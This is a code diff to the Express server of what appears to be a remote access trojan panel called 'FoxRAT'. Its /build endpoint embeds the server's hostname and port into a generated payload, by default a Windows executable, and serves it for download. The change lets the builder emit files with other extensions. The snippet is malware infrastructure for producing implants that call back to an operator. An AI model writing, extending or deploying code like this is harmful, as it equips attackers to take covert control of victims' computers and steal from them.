@@ -184,17 +184,18 @@ setInterval(() => {
 }, 300000);
 
 let builder = null;
-try { builder = require('./server_build'); } catch(_) { console.log('[Builder] Not available (Windows only)'); }
+try { builder = require('./server_build'); } catch(_) { console.log('[Builder] Not available'); }
 app.post('/build', authMiddleware, express.json({ limit: '50mb' }), async (req, res) => {
-    if (!builder) return res.status(503).json({ error: 'Builder not available on this server' });
+    if (!builder) return res.status(503).json({ error: 'Builder not available' });
     try {
         const opts = { ...req.body, host: req.hostname === '0.0.0.0' ? '127.0.0.1' : req.hostname, port: PORT };
-        const exeData = builder.build(opts);
+        const result = builder.build(opts);
         const safeName = (req.body.filename || 'FoxRAT').replace(/[^a-zA-Z0-9_-]/g, '') || 'FoxRAT';
         const dlId = crypto.randomBytes(8).toString('hex');
-        const dlPath = path.join(downloadsDir, dlId + '.exe');
-        fs.writeFileSync(dlPath, exeData);
-        res.json({ ok: true, downloadUrl: '/dl/' + dlId + '?name=' + safeName + '.exe' });
+        const ext = result.ext || '.exe';
+        const dlPath = path.join(downloadsDir, dlId + ext);
+        fs.writeFileSync(dlPath, result.data);
+        res.json({ ok: true, downloadUrl: '/dl/' + dlId + '?name=' + safeName + ext });
     } catch(e) {
         res.status(500).json({ error: e.message });
     }
